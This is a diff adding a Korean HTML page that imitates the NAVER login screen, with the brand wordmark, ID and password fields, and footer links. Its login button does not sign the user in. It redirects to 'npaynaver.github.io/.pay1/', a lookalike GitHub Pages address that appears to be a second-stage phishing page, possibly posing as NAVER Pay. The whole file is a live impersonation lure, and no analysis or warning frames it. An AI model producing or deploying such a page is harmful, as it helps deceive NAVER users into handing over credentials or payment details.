@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>NAVER 로그인</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Noto Sans KR', sans-serif;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      width: 360px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .naver-logo {
+      font-family: 'Arial Black', Impact, sans-serif;
+      font-size: 56px;
+      font-weight: 900;
+      color: #03c75a;
+      margin-bottom: 40px;
+      line-height: 1;
+      letter-spacing: -2px;
+      transform: scaleY(0.9);
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 10px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      background-color: #03c75a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #444;
+      margin-top: 14px;
+      width: 100%;
+    }
+
+    .checkbox-container input[type="checkbox"] {
+      margin-right: 8px;
+    }
+
+    .footer-links {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #999;
+    }
+
+    .footer-links a {
+      color: #999;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="naver-logo">
+  NAVE<span class="custom-r">R</span>
+</div>
+
+    <input type="text" placeholder="아이디">
+    <input type="password" placeholder="비밀번호">
+
+   <button class="login-button" onclick="window.location.href='https://npaynaver.github.io/.pay1/'">로그인</button>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="keep-login">
+      <label for="keep-login">로그인 상태 유지</label>
+    </div>
+
+    <div class="footer-links">
+      <a href="#">아이디 찾기</a> |
+      <a href="#">비밀번호 찾기</a> |
+      <a href="#">회원가입</a>
+    </div>
+  </div>
+
+</body>
+</html>
